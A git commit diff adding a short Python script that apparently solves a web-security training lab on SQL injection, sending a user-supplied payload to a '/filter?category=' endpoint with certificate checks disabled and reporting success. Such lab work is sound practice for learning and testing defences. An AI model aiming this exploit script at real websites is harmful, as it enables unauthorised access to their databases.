a010d854ba9fa82e1b8be98ef11d44ef72a40f31
emonhossain151 <ehosan151@gmail.com>
2025-03-07 23:44:35 +0600

    lab_1

--- SQLi/lab_1.py
+++ SQLi/lab_1.py
@@ -2,8 +2,17 @@ import requests
 import sys
 import urllib3
 
-proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1.8080'}
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+# proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1.8080'}
+
+def exploit_sqli(url, payload):
+    uri = '/filter?category='
+    req = requests.get(url + uri + payload, verify = False)
+    if "Cat Grin" in req.text:
+        return True
+    else:
+        return False
 
 
 if __name__ == "__main__":
@@ -14,3 +23,8 @@ if __name__ == "__main__":
         print("[-] Usage: %s <url> <payload>" % sys.argv[0])
         print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
         sys.exit()
+
+    if exploit_sqli(url, payload):
+        print("[+] SQL injection successful!")
+    else:
+        print("[-] SQL injection unsuccessful!")
